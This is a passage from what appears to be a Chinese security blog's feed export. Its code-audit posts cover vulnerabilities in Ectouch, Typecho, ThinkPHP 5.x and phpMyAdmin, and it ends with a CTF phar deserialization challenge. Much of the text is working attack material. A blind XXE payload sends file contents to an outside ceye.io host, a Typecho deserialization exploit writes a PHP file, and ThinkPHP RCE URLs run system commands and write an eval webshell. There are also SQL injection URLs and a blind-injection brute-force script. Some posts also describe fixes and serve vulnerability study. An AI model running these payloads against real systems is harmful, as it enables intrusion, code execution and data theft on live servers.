    <content type="text"><![CDATA[0x00 前言之前有了解过xxe漏洞，但没有在实际环境中分析过，这次刚好看到大佬发的Ectouch2.0 分析代码审计流程 (五) xxe漏洞，也跟入学习一波。 0x01 漏洞分析根据文中介绍，定位到wxpay.php的notify方法，可以看到在该方法中，用户可控的inputdata变量直接进入到simplexml_load_string()函数中，那么这里便可能存在xxe漏洞。 搜索全文，查看哪里用到了该方法。找到respond控制器的index方法，该方法中，payobj对象取决于this-&gt;data[‘code’],而且要进入分支还要求this-&gt;data[‘type’]==’notify’,查看其是否可控。可以看到这两个变量均可以通过get方法来控制。 另外漏洞利用上面判断是否存在通过get.code传入的wxpay插件，因为需要后台启用该插件。 另外由于在notify方法并未对数据进行输出，因此该漏洞为bind xxe，为了测试方便，我们先将数据进行输出。 下面便是构造payload，看看如何才能执行到这里。ectouch采用MVC模式，入口文件index.php中包含了/include/bootstrap.php继续跟进，62行看到路由解析函数urlRoute 最终定位到display方法获取到其模块控制器方法，分别使用吗m,c,a传入 至此便可构造pyload123456789?m=default&amp;c=respond&amp;a=index&amp;code=wxpay&amp;type=notifypost&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE foo [&lt;!ENTITY xxe "xxe test"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; 至此xxe漏洞确实存在了，但如何利用这个bind xxe呢，总不能让其自己加上输出语句吧。 使用payload12345&lt;?xml version="1.0"?&gt; &lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://127.0.0.1/xxe.dtd"&gt;%remote;%int;%send;]&gt; 上面payload中外部dtd文件 xxe.dtd内容为12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///f:/data.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ay82rc.ceye.io/?p=%file;'&gt;"&gt; 成功读到数据 参考一篇文章带你理解漏洞之 XXE 漏洞]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Typecho 反序列化漏洞分析]]></title>
    <url>%2FTypecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 前言Typecho install.php中存在反序列化漏洞，导致远程代码执行。 0x02 漏洞分析漏洞产生位置 漏洞产生在安装文件中，而前面代码只是做了简单的安装判断和跨站请求过滤，只需要对finish，REFEREER进行构造即可绕过。 接着向下分析，这里反序列化的参数是可以直接通过cookie或者post由用户控制的，所以我们只需要找到可利用的方法即可。 我们知道反序列化是将一个休眠对象(字符串)激活为一个对象，激活过程中会调用几种方法，我们只需要找到能够利用的方法即可。这里主要方法有123__wakeup()__construct()__toString() 对前两种方法进行全局搜索后均没有找到可以利用的地方。__toString()方法在类被做字符串处理时会被调用，如字符串拼接、输出操作等。而下面在创建新的Typecho_Db对象时，其构造函数中刚好对反序列化的内容进行了字符串拼接操作，给toString方法的利用带来了可能。但是在搜索toString方法时，因为水平不足并没有发现可以利用的点，这里向各位大神表示敬佩。在Typecho_Feed的toString方法中第358行$item[‘author’]调用screenName属性，如果该实例化对象用于从不可访问的属性读取数据，便会触发get()魔术方法。那么便可以进一步搜索__get()方法。 然后找到Typecho_Request类中的__get方法继续跟踪get最终在_applyFilter方法中找到可以利用的点，call_user_func 12345678910111213141516171819202122232425262728//exp&lt;?phpclass Typecho_Feed&#123; private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item) &#123; $this-&gt;_items[] = $item; &#125;&#125;class Typecho_Request&#123; private $_params = array('screenName'=&gt;'file_put_contents(\'info.php\', \'&lt;?php phpinfo();?&gt;\')'); private $_filter = array('assert');&#125;$feed = new Typecho_Feed();$req = new Typecho_Request();$feed-&gt;addItem(array('author'=&gt;$req));$exp=array('adapter'=&gt;$feed,'prefix'=&gt;'typecho_');echo base64_encode(serialize($exp));?&gt; 0x03 修复方法删除install.php]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5 Request 远程代码执行漏洞分析]]></title>
    <url>%2Fthinkphp5-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[影响版本根据thinkphp发布的5.0.24的补丁可以看到问题出在核心类Request的method方法。补丁增加了对传入的$method的限制。123漏洞影响的产品版本包括：ThinkPHP 5.0.x ~ 5.0.23版 漏洞分析本文以5.0.5 full版本进行分析 这里Config::get(‘var_method’)获取到的内容为_method,被称为表单请求类型伪装变量，具体功能不细究，可查阅官方文档了解。 那么在未打补丁之前对POST进来的_method变量未作任何过滤，而且下面直接进行了调用，而且函数参数可控。那么便可实现对本类所有方法的调用。1$this-&gt;($this-&gt;method)($_POST); 根据payload，其传入的是_method = __construct查看__construct方法 该方法对传入的参数数组进行遍历，并通过property_exists检查对象或类是否具有该属性。如果是本类的属性，则通过$this-&gt;$name = $item对属性进行重新赋值。那么这里因为传入的参数可控，可实现对Requset类下任意属性的覆盖。 单单一个变量覆盖是不能得到满足的，继续将这个漏洞扩大化。可以查看可以覆盖的属性，并看看这些属性的覆盖会不会引起更致命的操作。这是其中一部分属性而通过已知的payload了解到这里的全局过滤规则filter被覆盖。查看哪里用到了filter,搜索后发现该类中很多方法都用到了这个变量其中input方法中调用了filterValue方法而filterValue方法中，将其带入了call_user_func函数，这里还有一个参数value,向上跟踪value来自于input方法的data,继续往上查看到哪里调用了input。发现了param方法，data来自于其$this-&gt;param12// 当前请求参数和URL地址中的参数合并$this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false)); 其中$vars数组来自上面，也即我们通过http传入的参数 到此为止，call_user_func的两个变量我们均可以控制，便可以实现任意代码执行。 其中这里要想任意代码执行有两个条件： 1.调用method()实现filter变量覆盖 2.调用param()方法，实现任意代码执行链 首先是第一条在检测url路由check()中触发 整个调用链运行时自动加载 而第二个条件。全局搜索漏洞触发点，看看哪里调用了param方法。其中当开启debug时调用param。 当debug关闭时，继续搜索其他触发点。这里当dispatch[‘type’]==’method’时，触发param方法向上跟踪dispatch 最终还是与$request-&gt;method()有关而method方法返回的method是可以覆盖掉的，可以post传递method=get控制dispatch的最终值，从而进入method分支，调用param 0x02 payload最终payload123post:_method=__construct&amp;method=get&amp;filter=system&amp;boo=whoami]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 缓存函数设计缺陷 getshell]]></title>
    <url>%2Fthinkphp-%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7-getshell%2F</url>
    <content type="text"><![CDATA[thinkphp 缓存函数设计缺陷 getshell 0x00 前言&amp;&amp;影响版本不能说是thinkphp漏洞，因为官方压根就没承认，按照官方手册配置使用这个缓存功能是没有任何问题的，但单从其缓存函数上看确实存在因为未加过滤引起的可能getshell。123影响版本thinkphp 3.2.3-5.0.10 0x01 利用条件以下分析仅在理想环境下用于本地漏洞复现，生产环境下咯多漏洞利用难度系数较高，需要满足以下几个条件 开启缓存功能 缓存文件所在目录可以从浏览器直接访问，因为缓存文件可能不部署在web目录 需要能够猜解出缓存的文件名（文件名生成有一定规律） 同时可以控制缓存文件里的内容（比如通过写入到数据库进而生成缓存文件） 0x02 分析过程以5.0.10版本为例。 生成新的Home模块1php think build --module home 123456789101112131415161718192021222324252627//demo&lt;?php namespace app\home\controller; use think\Controller; use think\Request; use think\View; use think\Url; use think\Session; use think\Db; use app\home\model\Test as t; use think\Cache; use app\home\model\Article as a;class Index extends Controller&#123; public function add()&#123; $post = input('post.'); $article = Db::name('articles')-&gt;insert($post); var_dump($article); &#125; public function Cache()&#123; $article = Db::name('articles')-&gt;field('*')-&gt;select(); Cache::set('name',$article,3600); &#125;&#125; Demo建好了，add()方法用于向数据库中插入数据，cache()方法用于缓存数据。下面开始分析代码。当访问下面的url调用cache方法时 1http://127.0.0.1/thinkphp_5.0.10_full/public/index.php/Home/index/cache 函数调用栈这里重点说一下 thinkphp\cache]driver\File下的set()方法 首先跟入getCacheKey方法可以看到，获取到的是缓存文件目录，其将缓存名称经过md5()，前两位作为目录名，后面的作为缓存文件名。 其通过$this-&gt;option[‘path’]获得目录前缀，其默认是在 Runtime/cache/,可以通过修改CACHE_PATH使缓存目录放在非web目录，从而避免漏洞被利用。 获取到缓存文件名之后继续向下运行，可以看到将要缓存的数据进行序列化之后直接拼接写入到了缓存目录，也就是这里的数据没有做任何过滤，所以出现了漏洞。这里的data虽然拼接到了注释语句中，但是因为没有任何过滤可以通过注入换行符跳出单行注释，而且序列化函数不会对换行符做任何处理。 那么我们便可以通过demo中的add()方法先向数据库存入payload数据中 然后访问cache方法，既可以看到paylaod进入到了缓存文件 12//payloadcontent=%2f%2f%0d%0a%24a%3deval(%24_POST%5b%27a3%27%5d)%3b%23 0x03 修复方法 完善框架中set()方法，在/thinkphp/library/think/cache/driver/File.php 中的set()函数中对于$value参数进行过滤，去除换行符号。添加代码$data = str_replace(PHP_EOL, ‘’, $data);但存在因为去除换行符导致的文本布局改变。 从上面的审计中可以知道文件名是由缓存索引的md5值决定的，所以可以设置复杂的缓存索引。 修改CHCHE_PATH,使缓存目录放在用户不可访问的地方。 从php的配置入手，关闭eval等危险函数。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 5.0.10 sql注入漏洞 支持子查询]]></title>
    <url>%2Fthinkphp-5-0-10-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%E6%94%AF%E6%8C%81%E5%AD%90%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[0x00 前言&amp;&amp;影响版本在tp5 sql注入漏洞中，这个漏洞算是危害比较大的了，因为其他的sql注入一般不支持子查询。而这个漏洞只出现在5.0.10版本中，也算是将危害降到最低了。12漏洞影响版本thinkphp 5.0.10 0x01 漏洞成因那么为什么这个注入支持子查询呢。我们知道tp5重写了数据库操作类方法。而在5.0.10版本中，增加了NOT LIKE操作。可以看到进入这个分支后没有任何过滤，直接拼接到了whereStr变量，作为sql语句的一部分返回。而其他分支其实也没有做任何过滤，为什么增加了NOT LIKE后出现了漏洞呢？那是因为tp5的助手函数input()在输入数据时，进行了过滤操作。这里主要说filterExp()这里进行关键字匹配，当匹配到时在关键字后面添加空格。这样我们就不能控制上面进入相应的分支了，在函数中可以可以包括了很多能控制分支流程的关键字，却唯独没有NOT LIKE。那么说到这里我们也就明白了，漏洞的成因是在5.0.10版本数据库操作类方法中增加了NOT LIKE但是filterExp函数没有及时更正更新导致了sql注入。 0x02 测试demo1234567public function index() &#123; $data = input('get.name/a'); $sql_data = db('think_user')-&gt;where(array('username'=&gt;$data))-&gt;select(); var_dump($sql_data); &#125; 12payloadhttp://127.0.0.1/thinkphp_5.0.10_full/public/index.php/Index/index/index?name[0]=not%20like&amp;name[1][0]=123&amp;name[1][1]=6666&amp;name[2]=) and 1=2 union select 1,user(),3,4,id from think_user -- + 0x03 修补方法在filterExp()方法中增加NOT LIKE]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5.0.x sql注入分析]]></title>
    <url>%2Fthinkphp5-0-x-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 影响版本12漏洞受影响的版本thinkphp 5.0.x &lt;= 5.0.15 0x01 漏洞分析首先看一下官方commit，可以看到补丁对val[1]进行了判断，之前未作处理直接进行了拼接。 根据补丁我们逆着分析，也就说只要控制了val[1],就能进行sql注入。补丁在parseData方法中，val[1]来自data，查看这个data是从哪里来的，找到调用parseData方法的地方。 可以看到有两处调用，分别查看一下 一个是该类下的update方法 一个是insert方法 那么可以猜测在执行数据库更新或者插入操作时可能存在注入。 这里以insert方法为例继续分析。根据上面的代码可以看到data直接带入到parseData中执行解析操作，那么我们继续向上追踪。找到Query类下的insert方法对其进行了传参并调用。 可以看到，这里的data就是调用insert方法时直接传入的参数，这里可以写一个简单的demo便于后续的操作和理解12345678910111213&lt;?phpnamespace app\index\controller;use think\Db;class Index&#123; public function index() &#123; $name = input("get.name/a"); Db::table("think_user")-&gt;where(["id"=&gt;1])-&gt;insert(["username"=&gt;$name]); return "ThinkPHP SQL Test."; &#125;&#125; 在这段demo中进入insert的是由get来的name是用户完全可控的。 到现在为止，我们已经知道上面提到的data是完全可以由用户控制的，那么我们回过头来，继续看看 漏洞是如何发生的。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152protected function parseData($data, $options) &#123; if (empty($data)) &#123; return []; &#125; // 获取绑定信息 $bind = $this-&gt;query-&gt;getFieldsBind($options['table']); if ('*' == $options['field']) &#123; $fields = array_keys($bind); &#125; else &#123; $fields = $options['field']; &#125; $result = []; foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // 对象数据写入 $val = $val-&gt;__toString(); &#125; if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) &#123; if ($options['strict']) &#123; throw new Exception('fields not exists:[' . $key . ']'); &#125; &#125; elseif (is_null($val)) &#123; $result[$item] = 'NULL'; &#125; elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; elseif (is_scalar($val)) &#123; // 过滤非标量数据 if (0 === strpos($val, ':') &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) &#123; $result[$item] = $val; &#125; else &#123; $key = str_replace('.', '_', $key); $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = ':data__' . $key; &#125; &#125; &#125; return $result; &#125; 通过上面的代码就可以发现，switch分支根据val[0]进行选择，当进入到case ‘inc’时，val[1]进入了parseKey方法。但是跟踪parseKey发现，其对传入的参数未作任何处理直接返回 当传入payload,这里直接进行了拼接返回，并通过上面的一些列调用，执行了payload1http://127.0.0.1/thinkphp_5.0.14_full/public/index.php/index/index/index?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&amp;name[2]=1 执行结果 0x02 后记但是这个漏洞比较鸡肋的是查询user() database()等，不能进行子查询。原因是因为thinkphp框架使用参数化查询PDO，将参数与查询语句分离，降低了漏洞风险，后门将会针对该框架的PDO进行分析。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp 5.1.x order by注入分析]]></title>
    <url>%2Fthinkphp-5-1-x-order-by%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 影响版本123漏洞影响版本thinkphp5.1.x &lt; 5.1.23 0x01 漏洞分析首先看一下官方commit payload1http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,%27boo%27)|%20updatexml(1,concat(0x3c,user(),0x3e),1)%23][]=1 由补丁可以看出，当val是数组时增加了对key的判断，那么问题应该出在未对key进行过滤，而key被带进入parseOrderField中，跟踪一下。这里getOptions()函数是获取了当前要查询的参数，getFieldsBind()函数是获取数据表绑定信息。查看最后的return语句,这里将val拼接到key的后面，那么这个val值其实是不用的，只要key值可控，就可以将后面的注释掉1return 'field(' . $this-&gt;parseKey($query, $key, true) . ',' . implode(',', $val) . ')' . $sort; 因为这里parseKey对key进行了处理，继续跟进。这里对key值进行了多重判断12345671. is_numeric判断，如果是数字，则返回，不是的话继续向下执行2. 判断$key是否属于Expression类3. strpos($key, '-&gt;') &amp;&amp; false ===strpos($key, '(') 4. ('*' != $key &amp;&amp; ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) 这里注入的sql语句进入了第四个判断,即将key用包裹。123if ('*' != $key &amp;&amp; ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) &#123; $key = '`' . $key . '`'; &#125; 然后回到上一层,进行拼接返回1return 'field(' . $this-&gt;parseKey($query, $key, true) . ',' . implode(',', $val) . ')' . $sort; 拼接得到 field(SQL注入语句,$val) 可以看到我们需要对`闭合并且注释掉后面的内容。 两外field()函数，field()函数必须指定大于等于两个字段才可以正常运行，否则就会报错。而且当field中的参数不是字符串或数字时，指定的参数必须是正确的表字段，否则程序就会报错。这里由于程序会在第一个字段中加 限制,所以必须指定正确的字段名称。第二个字段没有限制，可以指定字符串或数字。 那么payload 可以是1http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,'boo')|%20updatexml(1,concat(0x3c,user(),0x3e),1)#][]=1 0x02 后记因为tp5 pdo的原因，还是不能进行子查询。 天融信关于ThinkPHP 5.1.x SQL注入漏洞分析]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp5.x 远程代码执行漏洞]]></title>
    <url>%2Fthinkphp5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 影响版本此次漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞。 1234漏洞影响版本为：ThinkPHP 5.0.5-5.0.22ThinkPHP 5.1.0-5.1.30 漏洞分析首先看一下官方commit从补丁可以看出，漏洞产生的原因就是对于$controller没做过滤。 下面以thinkphp 5.1.29为例进行分析 先从补丁处向下追踪 $controller未作任何过滤赋值给了Moudle类的controller属性然后该属性在exec方法中被传入$this-&gt;app-&gt;controller. 继续跟踪App类下的controller方法，发现name参数进入parseMoudleAndCLass方法 继续查看，在该方法的第一个if分支，当name中含有\时，直接将name作为类名返回。根据下面路由地址定义的第四条，命令空间含有\，而且可以直接路由到类，那么只要我们能够控制controller就能访问任何类的任意方法。 此时我们再从补丁处向上分析，查看controller从哪里来的。 这里$this-&gt;dispath最终调用的时Request类的path()方法解析路由信息。这里pathinfo获取的时var_pathinfo,即我们可以GET方式传入参数index.php?s=index/\namespace\class/method,这里具体不细说，可以动态调试函数调用栈查看其具体过程。 到此为止，我们能够控制补丁处的controller，而从调用任何类的方法，此处只需要找到可以利用的类和方法即可 0x02 playload1234567891011121314151617181920211.利用system函数远程命令执行 http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami其中5.0.5版本 ?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami去掉think前面的\即可2.通过phpinfo函数写出phpinfo()的信息http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=13.写入shell:http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php或者http://localhost:9096/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=../test.php&amp;vars[1][]=&lt;?php echo 'ok';?&gt;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin4.8.0~4.8.3任意文件包含payload]]></title>
    <url>%2Fphpmyadmin4-8-0-4-8-3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%2F</url>
    <content type="text"><![CDATA[payload:1http://127.0.0.1/phpmyadmin-4.8.1/index.php?target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/foo/bar.frm 参考链接：【首发】phpmyadmin4.8.1后台getshell 还可以包含session文件：https://yq.aliyun.com/articles/603201]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[regexp盲注]]></title>
    <url>%2Fregexp%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[红日安全团队的发出的一道题目1234567891011121314151617181920212223242526272829&lt;?php include "./config.php";include "./flag.php";error_reporting(0);$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";$black_list .= "=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";if(preg_match($black_list, $_GET['user'])) exit(":P"); if(preg_match($black_list, $_GET['pwd'])) exit(":P"); $query="select user from users where user='$_GET[user]' and pwd='$_GET[pwd]'";echo "&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;";$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); if($row['user']) echo "&lt;h2&gt;Welcome &#123;$row['user']&#125;&lt;/h2&gt;";&#125;$result = $conn-&gt;query("select pwd from users where user='admin'");if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $admin_pass = $row['pwd'];&#125;if(($admin_pass)&amp;&amp;($admin_pass === $_GET['pwd']))&#123; echo $flag;&#125;highlight_file(__FILE__);?&gt; 审计代码可以看到在登陆处存在注入，但是前面black_list对get的user、pwd都进行了过滤。那我们就要想办法对waf进行让绕过，首先对单引号的过滤导致无法常规闭合原来的查询语句，那么这里可以使用\转义原有语句的单引号,使其与后面的单引号闭合，然后注释掉最后的单引号即可。但是这里对注释符# -进行了过滤，可以使用;%00绕过。再就是对一些sql语句进行了过滤，但是并没有过滤 REGEXP 正则操作符。 payload1http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/"^c";%00 python脚本123456789101112131415161718192021import requestsstr1 = '0123456789abcdefghijklmnopqrstuvwxyz_'url = 'http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/"^&#123;0&#125;";%00'md5 = ''while 1: for i in str1: x = md5+i u = url.format(x) #print u res = requests.get(u) if 'Welcome Admin' in res.text: md5 = md5+i print md5 break if i =='_': break]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phar 实现php反序列化]]></title>
    <url>%2Fphar-%E5%AE%9E%E7%8E%B0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[0x00 背景在Blackhat2018，安全研究员Sam Thomas分享了议题It’s a PHP unserialization vulnerability Jim, but not as we know it,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。 0x01 原理漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。 0x02 漏洞利用利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 下面的函数可以利用 测试demo123456789101112//index.php&lt;?phpclass foo&#123; var $ha = 'echo "ok";'; function __destruct() &#123; eval($this-&gt;ha); &#125;&#125;$ka = $_GET['file'];file_exists($ka); 可以看到foo是一个危险函数，当危险的对象被反序列化时eval会导致命令执行。这里正好有一个file_exists的文件操作函数，为了测试方便，我们直接生成phar文件放在index.php所在目录。 1234567891011121314151617181920212223//构造phar文件的代码&lt;?php//把要进行反序列化的对象放在此处class foo&#123; var $ha = 'echo "ok";'; function __destruct() &#123; eval($this-&gt;ha); &#125;&#125; //生成对应可被利用的对象 $o = new foo(); $o-&gt;ha='echo "hello boogle";'; @unlink("phar.phar"); $phar = new Phar("phar.phar"); $phar-&gt;startBuffering(); $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头用以欺骗检测 $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 这里因为调用了phar的setMetadata方法，所以需要设置php.ini中phar.readonly = Off 而使用phar文件只需要(PHP 5 &gt;= 5.3.0, PHP 7, PECL phar &gt;= 1.0.0)即可。这里生成的phar.phar可以修改为任意文件后缀，比如1.gif。然后访问index.php，使用phar://读取 0x03 CTF题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138&lt;?php $SECRET = `../read_secret`; $SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]); $FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]); @mkdir($SANDBOX); @mkdir($FILEBOX); if (!isset($_COOKIE["session-data"])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac("md5", $data, $SECRET); setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; $this-&gt;avatar = $path; &#125; &#125; class K0rz3n_secret_flag &#123; protected $file_path; function __destruct()&#123; if(preg_match('/(log|etc|session|proc|read_secret|history|class)/i', $this-&gt;file_path))&#123; die("Sorry Sorry Sorry"); &#125; include_once($this-&gt;file_path); &#125; &#125; function check_session() &#123; global $SECRET; $data = $_COOKIE["session-data"]; list($data, $hmac) = explode("-----", $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; die("Bye"); &#125; if ( !hash_equals(hash_hmac("md5", $data, $SECRET), $hmac) )&#123; die("Bye Bye"); &#125; $data = unserialize($data); if ( !isset($data-&gt;avatar) )&#123; die("Bye Bye Bye"); &#125; return $data-&gt;avatar; &#125; function upload($path) &#123; if(isset($_GET['url']))&#123; if(preg_match('/^(http|https).*/i', $_GET['url']))&#123; $data = file_get_contents($_GET["url"] . "/avatar.gif"); if (substr($data, 0, 6) !== "GIF89a")&#123; die("Fuck off"); &#125; file_put_contents($path . "/avatar.gif", $data); die("Upload OK"); &#125;else&#123; die("Hacker"); &#125; &#125;else&#123; die("Miss the URL~~"); &#125; &#125; function show($path) &#123; if ( !is_dir($path) || !file_exists($path . "/avatar.gif")) &#123; $path = "/var/www"; &#125; header("Content-Type: image/gif"); die(file_get_contents($path . "/avatar.gif")); &#125; function check($path)&#123; if(isset($_GET['c']))&#123; if(preg_match('/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i',$_GET['c']))&#123; die("Hacker Hacker Hacker"); &#125;else&#123; $file_path = $_GET['c']; list($width, $height, $type) = @getimagesize($file_path); die("Width is ：" . $width." px&lt;br&gt;" . "Height is ：" . $height." px&lt;br&gt;"); &#125; &#125;else&#123; list($width, $height, $type) = @getimagesize($path."/avatar.gif"); die("Width is ：" . $width." px&lt;br&gt;" . "Height is ：" . $height." px&lt;br&gt;"); &#125; &#125; function move($source_path,$dest_name)&#123; global $FILEBOX; $dest_path = $FILEBOX . "/" . $dest_name; if(preg_match('/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i',$source_path))&#123; die("Hacker Hacker Hacker"); &#125;else&#123; if(copy($source_path,$dest_path))&#123; die("Successful copy"); &#125;else&#123; die("Copy failed"); &#125; &#125; &#125; $mode = $_GET["m"]; if ($mode == "upload")&#123; upload(check_session()); &#125; else if ($mode == "show")&#123; show(check_session()); &#125; else if ($mode == "check")&#123; check(check_session()); &#125; else if($mode == "move")&#123; move($_GET['source'],$_GET['dest']); &#125; else&#123; highlight_file(__FILE__); &#125; include("./comments.html"); 参考文章：https://www.cnblogs.com/iceli/p/9564061.htmlhttps://paper.seebug.org/680/]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[sql注入 & 服务端模板注入（SSTI）]]></title>
    <url>%2Fsql%E6%B3%A8%E5%85%A5-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89%2F</url>
